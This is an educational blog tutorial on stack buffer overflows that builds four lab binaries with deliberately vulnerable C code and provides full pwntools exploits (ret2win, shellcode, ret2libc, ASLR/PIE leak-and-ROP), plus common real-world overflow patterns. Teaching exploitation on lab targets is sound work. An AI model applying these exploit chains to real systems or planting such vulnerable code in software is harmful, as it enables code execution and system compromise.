---
title: Stack-Based Buffer Overflow  From Zero to Shell
description: There's a moment every exploit developer remembers — the first time you type `python3 -c "print('A'*100)"` into a terminal, pipe it into a binary, and watch `Segmentation fault` light up your screen. That crash is not a failure. That crash is a hello.
category: pwn
date: 2026-07-01
reading_time: 20
tags: [pwn, c]
slug: stack-based-buffer-overflow-from-zero-to-shell
---

*by mrdevnull · binary exploitation series · part 1*

## Introduction

---

There's a moment every exploit developer remembers — the first time you type `python3 -c "print('A'*100)"` into a terminal, pipe it into a binary, and watch `Segmentation fault` light up your screen. That crash is not a failure. That crash is a hello.

This is the foundation. Everything in binary exploitation — heap feng shui, kernel ROP, FSOP — is downstream of understanding what happens on the stack when you write past the end of a buffer. We're going to tear it apart completely: the theory, the memory layout, the toolchain, and four progressively harder practical examples with full exploit scripts.

No hand-waving. No skipping the hard parts.

---

## 1. The Stack: A Precise Mental Model

Before you can exploit it, you need to see it clearly.

The stack is a region of memory that grows **downward** on x86 and x86-64. High addresses at the top, low addresses at the bottom. Every time a function is called, the CPU pushes a new **stack frame** onto it. Every time a function returns, that frame is torn down.

A stack frame contains, in order from high to low addresses:

```
High addresses
┌──────────────────────────────┐
│  ... (caller's frame)        │
├──────────────────────────────┤  ← caller's RSP before call
│  return address (8 bytes)    │  ← pushed by CALL instruction
├──────────────────────────────┤
│  saved RBP (8 bytes)         │  ← pushed by function prologue
├──────────────────────────────┤  ← RBP points here
│  local variables             │
│  buffers                     │
│  ...                         │
├──────────────────────────────┤  ← RSP points here
│  (red zone / stack args)     │
Low addresses
```

Two registers govern this:

- **RSP** (stack pointer): always points to the top of the stack — the lowest currently-used address.
- **RBP** (base pointer): points to the base of the current frame. Used to reference local variables at predictable negative offsets (`[rbp-0x10]`).

The **function prologue** sets this up:

```asm
push rbp          ; save caller's frame pointer
mov  rbp, rsp     ; set our frame pointer
sub  rsp, 0x50    ; allocate N bytes for locals
```

The **function epilogue** tears it down:

```asm
leave             ; mov rsp, rbp; pop rbp
ret               ; pop rip (loads return address into instruction pointer)
```

That `ret` instruction is your target. It pops whatever is sitting at `[RSP]` into `RIP` and jumps there. If you control what's at `[RSP]` at the moment `ret` executes, you control execution.

---

## 2. The Vulnerability: What "Buffer Overflow" Actually Means

A buffer is a fixed-size region of memory. In C, when you write to a buffer, the language does not check bounds. There is no runtime exception. The CPU will faithfully copy bytes past the end of the buffer into whatever memory follows it — which, on the stack, is the saved RBP and the return address.

The classic vulnerable function:

```c
void vuln(void) {
    char buf[64];
    gets(buf);   // reads until newline, no length limit whatsoever
}
```

Memory layout when `vuln()` is executing:

```
┌──────────────────────┐ ← high
│  return address      │  [rbp+0x08]
├──────────────────────┤
│  saved RBP           │  [rbp+0x00]
├──────────────────────┤ ← RBP
│  buf[63]             │
│  ...                 │
│  buf[0]              │  [rbp-0x40]
└──────────────────────┘ ← RSP, low
```

When you feed 80 bytes of input:
- bytes 0–63: fill `buf`
- bytes 64–71: overwrite saved RBP
- bytes 72–79: overwrite the return address

When `vuln()` returns, `ret` pops your 8 bytes into RIP. If those bytes are a valid address, execution jumps there. That's the primitive.

---

## 3. Environment Setup

```bash
# Ubuntu 22.04 / Debian — install everything you need
sudo apt update
sudo apt install -y gcc gdb python3 python3-pip pwndbg nasm binutils

# pwntools
pip3 install pwntools

# pwndbg (better gdb)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# checksec — inspect binary protections
pip3 install checksec
```

Compile with protections **disabled** for the first examples, then we'll enable them one by one:

```bash
# Disable all mitigations: no canary, no PIE, executable stack (NX off)
gcc -o vuln vuln.c \
    -fno-stack-protector \
    -no-pie \
    -z execstack \
    -m64

# Check what's enabled
checksec --file=vuln
```

`checksec` output to understand:

```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE
```

Each of these is a mitigation we'll encounter and defeat:

| Flag | Meaning |
|------|---------|
| Stack canary | Random value before return address; crashes if tampered |
| NX / DEP | Stack memory marked non-executable; blocks shellcode |
| PIE | Binary loaded at random base address; breaks hardcoded addresses |
| Full RELRO | GOT made read-only; blocks GOT overwrites |

---

## 4. Lab 1 — Classic ret2win (No Mitigations)

### Source

```c
// lab1.c
#include <stdio.h>
#include <stdlib.h>

void win(void) {
    puts("[*] you called win()");
    system("/bin/sh");
}

void vuln(void) {
    char buf[64];
    printf("input: ");
    gets(buf);
}

int main(void) {
    vuln();
    return 0;
}
```

```bash
gcc -o lab1 lab1.c -fno-stack-protector -no-pie -z execstack
```

### Finding the Offset

Open GDB with pwndbg:

```
gdb ./lab1
```

Generate a De Bruijn (cyclic) pattern — a string where every 8-byte substring is unique, so you can find the exact offset from the crash:

```
pwndbg> cyclic 200
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaaa
```

```
pwndbg> run
input: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaaa
```

The crash shows:

```
RIP: 0x6161616161616166 ('faaaaaaa')
```

```
pwndbg> cyclic -l 0x6161616161616166
72
```

Offset is **72 bytes**. That means: 64 bytes buffer + 8 bytes saved RBP = 72 bytes of padding, then 8 bytes of return address.

Verify with `objdump`:

```bash
objdump -d lab1 | grep -A5 '<win>'
# 0x0000000000401196 <win>:
```

Or in pwndbg:

```
pwndbg> p win
$1 = {<text variable, no debug info>} 0x401196 <win>
```

### Exploit

```python
# exploit_lab1.py
from pwn import *

elf = ELF('./lab1')
p   = process('./lab1')

offset   = 72
win_addr = elf.symbols['win']

log.info(f"win @ {hex(win_addr)}")

payload = flat(
    b'A' * offset,
    p64(win_addr)
)

p.sendlineafter(b'input: ', payload)
p.interactive()
```

```bash
python3 exploit_lab1.py
# [*] you called win()
# $ whoami
# mrdevnull
```

Done. You've overwritten the return address and redirected execution to `win()`.

---

## 5. Lab 2 — Shellcode Injection (NX Disabled)

When there's no `win()` function, you inject your own code. This requires NX to be off so the stack is executable.

```c
// lab2.c
#include <stdio.h>

void vuln(void) {
    char buf[128];
    printf("input: ");
    read(0, buf, 256);  // reads 256 bytes into 128-byte buffer
}

int main(void) {
    vuln();
    return 0;
}
```

```bash
gcc -o lab2 lab2.c -fno-stack-protector -no-pie -z execstack
```

The plan:

1. Find the address of `buf` on the stack
2. Write shellcode into `buf`
3. Overwrite return address with address of `buf`

### Finding the Buffer Address

```
gdb ./lab2
pwndbg> break vuln
pwndbg> run < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*200)")
pwndbg> x/20gx $rsp
```

Look for your `0x4141414141414141` pattern and find where `buf` starts relative to RBP. Or use:

```
pwndbg> info frame
```

Note `buf` is at `rbp-0x80` (128 bytes = 0x80).

### Exploit

```python
# exploit_lab2.py
from pwn import *

context.arch = 'amd64'
context.os   = 'linux'

p = process('./lab2')

# pwntools built-in shellcode: execve("/bin/sh", NULL, NULL)
shellcode = asm(shellcraft.sh())

# gdb: buf is at rbp-0x80, return addr at rbp+0x08
# total offset = 0x80 + 0x08 = 136 bytes
offset = 136

# We need the runtime address of buf.
# With no PIE and no ASLR (or after leaking), we get it from /proc or gdb.
# For ASLR disabled: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
#
# In gdb: p &buf -> 0x7fffffffe3a0  (example)
buf_addr = 0x7fffffffe3a0  # replace with your value from gdb

payload = flat(
    shellcode,
    b'A' * (offset - len(shellcode)),
    p64(buf_addr)
)

p.sendafter(b'input: ', payload)
p.interactive()
```

> **Note**: ASLR makes `buf_addr` change every run. To work around this without a leak you can disable ASLR for practice (`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`), or use a NOP sled (pad before shellcode with `\x90` bytes so you only need to land anywhere in a wide window).

### NOP Sled Variant

```python
nop_sled  = b'\x90' * 100
shellcode = asm(shellcraft.sh())
padding   = b'A' * (offset - len(nop_sled) - len(shellcode))

# Point return address anywhere into the NOP sled
payload = nop_sled + shellcode + padding + p64(buf_addr + 10)
```

---

## 6. Lab 3 — ret2libc (NX Enabled, no PIE, no canary)

NX is on. The stack is not executable. We can't run shellcode on the stack. Instead, we return into existing executable code — specifically into `libc`'s `system()` function with `/bin/sh` as the argument.

```bash
gcc -o lab3 lab3.c -fno-stack-protector -no-pie
# NX is ON by default now (no -z execstack)
checksec --file=lab3
# NX: NX enabled ✓
```

On x86-64 Linux, the first argument to a function is passed in **RDI**. So the calling convention we need:

```
RDI = address of "/bin/sh" string
RSP → system()
```

To set RDI, we need a ROP gadget: `pop rdi; ret`. This pops the next value off the stack into RDI, then returns to whatever comes after it.

### Finding Gadgets

```bash
# ROPgadget
pip3 install ropgadget
ROPgadget --binary lab3 | grep "pop rdi"
# 0x00000000004011d3 : pop rdi ; ret

# or with pwntools ropper
ropper -f lab3 --search "pop rdi"
```

### Finding libc Addresses

```bash
# Find which libc is linked
ldd lab3
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6

# Get addresses of system() and "/bin/sh" in libc
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " system@@"
strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```

With no PIE, `lab3` is at a fixed base. But libc IS randomized by ASLR. For now (no ASLR) or with a leak, the base is known.

### Exploit

```python
# exploit_lab3.py
from pwn import *

elf  = ELF('./lab3')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p    = process('./lab3')

offset = 72  # same as before for a 64-byte buf

# With no ASLR: libc base is fixed
# In real exploit: compute from leak (lab4 shows this)
libc.address = 0x00007ffff7dc4000  # get from: gdb, vmmap, or /proc/PID/maps

pop_rdi  = 0x00000000004011d3          # from ROPgadget
bin_sh   = next(libc.search(b'/bin/sh'))
system   = libc.sym['system']

# x86-64 ABI: stack must be 16-byte aligned before CALL.
# 'system' internally does MOVAPS which requires alignment.
# Add a 'ret' gadget to adjust alignment by 8 bytes.
ret_gadget = 0x000000000040101a       # a bare 'ret' from the binary

log.info(f"pop rdi  @ {hex(pop_rdi)}")
log.info(f"/bin/sh  @ {hex(bin_sh)}")
log.info(f"system() @ {hex(system)}")

payload = flat(
    b'A' * offset,
    p64(ret_gadget),   # alignment fix
    p64(pop_rdi),
    p64(bin_sh),
    p64(system),
)

p.sendlineafter(b'input: ', payload)
p.interactive()
```

The **stack alignment** issue trips up many beginners. `system()` uses `movaps` (aligned move) internally, which segfaults on unaligned RSP. Adding a bare `ret` gadget before the chain shifts RSP by 8, restoring 16-byte alignment.

---

## 7. Lab 4 — Full ASLR + PIE Bypass (Leak → ret2libc)

This is where the real game starts. PIE randomizes the binary base. ASLR randomizes libc. Every run, every address is different. You need a **leak**.

### Strategy

1. Use the overflow to call `puts(got['puts'])` — this prints the *runtime address* of `puts` in libc
2. Parse the leak to compute libc base: `libc_base = leaked_puts - libc.sym['puts']`
3. Send a second payload (via a `main` re-call) with correct addresses now computed

```c
// lab4.c — same vuln, no win(), all mitigations except canary
#include <stdio.h>
#include <string.h>

void vuln(void) {
    char buf[64];
    printf("input: ");
    fflush(stdout);
    read(0, buf, 256);
}

int main(void) {
    vuln();
    return 0;
}
```

```bash
gcc -o lab4 lab4.c -fno-stack-protector -pie
checksec --file=lab4
# NX: enabled, PIE: enabled
```

With PIE, you cannot use static gadget addresses. But leaked addresses are runtime addresses, and the offset between symbols within the same binary/library is always constant regardless of base.

### Two-Stage Exploit

```python
# exploit_lab4.py
from pwn import *

elf  = ELF('./lab4')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p    = process('./lab4')

offset = 72

# ── Stage 1: leak libc via puts(got['puts']) ──────────────────────────
# We need gadgets from the binary. With PIE, we must leak binary base first.
# Trick: the binary's LOAD segment is mapped at page-aligned address.
# We can use the PLT (which is position-independent) and GOT.

# pwntools resolves PIE symbols at load time — use elf.plt / elf.got
# which contain the OFFSET from base. We need to add elf.address (0 until leaked).

# With PIE: first leak the binary base via an info leak if possible.
# Alternatively: leak via the PLT/GOT directly since PLT is executable
# and the dynamic linker resolves GOT lazily.

# Find gadgets in the binary — with PIE, gadgets are at (elf.address + offset)
# After loading, pwntools gives you raw offsets in elf.symbols.

# We need: pop rdi; ret — search at load time
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

# puts@plt will call the real puts (resolving via GOT)
# puts@got contains the runtime address of puts in libc
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main     = elf.sym['main']

log.info(f"pop rdi  @ {hex(pop_rdi)}")
log.info(f"puts@plt @ {hex(puts_plt)}")
log.info(f"puts@got @ {hex(puts_got)}")

# Leak payload: call puts(got['puts']), then return to main for stage 2
leak_payload = flat(
    b'A' * offset,
    p64(ret),          # alignment
    p64(pop_rdi),
    p64(puts_got),
    p64(puts_plt),
    p64(main),         # loop back for second input
)

p.sendafter(b'input: ', leak_payload)

# Parse the leaked address (puts prints until null byte, 6 bytes on x86-64)
p.recvuntil(b'input: ')  # skip first prompt
leaked = p.recvline().strip()
leaked_puts = u64(leaked.ljust(8, b'\x00'))
log.success(f"leaked puts @ {hex(leaked_puts)}")

# ── Stage 2: compute bases, send shell payload ────────────────────────
libc.address = leaked_puts - libc.sym['puts']
log.success(f"libc base  @ {hex(libc.address)}")

bin_sh  = next(libc.search(b'/bin/sh'))
system  = libc.sym['system']

shell_payload = flat(
    b'A' * offset,
    p64(ret),
    p64(pop_rdi),
    p64(bin_sh),
    p64(system),
)

p.sendafter(b'input: ', shell_payload)
p.interactive()
```

This is the **canonical CTF exploit pattern**: leak → compute base → rop to shell. Master this and you've mastered the foundation of userland exploitation.

---

## 8. Debugging Methodology

These are the GDB workflows you'll use constantly:

```bash
# Set a breakpoint right before the return
gdb ./lab1
pwndbg> break *vuln+42    # after gets() returns
pwndbg> run

# Inspect the stack at the moment of ret
pwndbg> x/20gx $rsp        # show 20 qwords from RSP
pwndbg> info frame           # show frame info: saved regs, frame addr

# Step to the ret instruction and watch RIP change
pwndbg> ni                   # next instruction (no follow calls)

# Print a symbol's address
pwndbg> p &win
pwndbg> p system

# Find strings
pwndbg> search -s "/bin/sh"

# Find ROP gadgets
pwndbg> rop --grep "pop rdi"

# Inspect mappings (ASLR, libc base)
pwndbg> vmmap

# Dump memory as hex + ASCII
pwndbg> hexdump $rsp 64
```

---

## 9. How Mitigations Actually Work (and Their Limits)

### Stack Canary

The compiler inserts a random 8-byte value (the canary) between local variables and the saved RBP/return address. Before `ret`, it checks that the canary is unchanged. If not, it calls `__stack_chk_fail()` which terminates the program.

```
┌──────────────────────┐
│  return address      │
├──────────────────────┤
│  saved RBP           │
├──────────────────────┤
│  canary (8 bytes)    │ ← random, checked before ret
├──────────────────────┤
│  buf[]               │
└──────────────────────┘
```

**Bypasses**: format string to leak the canary, then include correct value in overflow. Or: overwrite past canary entirely if you also know its value.

### NX / DEP

The OS marks stack pages as non-executable (via the NX bit in page tables). Any attempt to jump to stack memory triggers a page fault → SIGSEGV.

**Bypass**: ROP — you don't inject new code, you chain together existing code already in executable memory.

### PIE (Position Independent Executable)

The binary is compiled as a shared object. The kernel maps it at a random base address each run. All addresses within the binary are randomized together (same relative offset, random base).

**Bypass**: any memory disclosure (format string, use-after-free read, etc.) that lets you read a pointer inside the binary, then subtract the known offset to get the base.

### ASLR

The kernel randomizes the base address of stack, heap, and shared libraries independently. On x86-64, only the upper bits are randomized (typically 28 bits of entropy for mmap, 20 for stack).

**Bypass**: information leak of any libc pointer (function pointers in memory, GOT entries, `__libc_start_main` return address on the stack). One leaked address → full libc base → all libc symbols known.

---

## 10. Real Vulnerability Patterns

Pure `gets()` barely exists in the wild. Here's what real overflow triggers look like:

```c
// Pattern 1: memcpy with user-controlled length
void parse_packet(char *data, size_t user_len) {
    char buf[512];
    memcpy(buf, data, user_len);  // user_len > 512 = overflow
}

// Pattern 2: sprintf into fixed buffer
void build_path(char *user_input) {
    char path[256];
    sprintf(path, "/var/www/%s", user_input);  // overflow if user_input > ~246 bytes
}

// Pattern 3: off-by-one (fence-post error)
void copy_str(char *src) {
    char buf[64];
    for (int i = 0; i <= 64; i++)  // <= instead of <
        buf[i] = src[i];
}

// Pattern 4: integer overflow in length check
void safe_copy(char *src, unsigned int len) {
    char buf[128];
    if (len + 1 < 128)      // len = 0xFFFFFFFF → len+1 = 0 → passes!
        memcpy(buf, src, len);
}
```

Each of these creates the same primitive: controlled bytes written past the end of a stack buffer. The exploitation path is identical once you have that primitive.

---

## 11. Putting It Together: The Exploit Development Workflow

When you encounter a binary with a suspected stack overflow:

```
1. checksec → identify protections
2. gdb + cyclic pattern → find exact offset
3. Identify what you have:
   - No NX, no PIE, no canary → shellcode
   - NX on, no PIE, no canary → ret2libc / ret2win with static addresses
   - NX on, PIE on, no canary → leak + compute bases + rop
   - Canary present → find leak primitive first
4. Find gadgets (ROPgadget / pwntools ROP())
5. Build payload in pwntools
6. Test locally, adjust offsets
7. Port to remote target
```

The exploit is always a pipeline: corrupt the return address with a chain that achieves your goal. The complexity is in building the chain and acquiring the addresses to put in it.

---

## What's Next

Stack-based buffer overflow is the entry point. The same principle — controlled write past a buffer's end — powers everything above it in complexity. In the next part we'll look at **ret2plt and GOT hijacking** in depth, and then move into the heap where the allocator metadata becomes the target.

The stack is where every exploit developer learns to walk. Now you run.
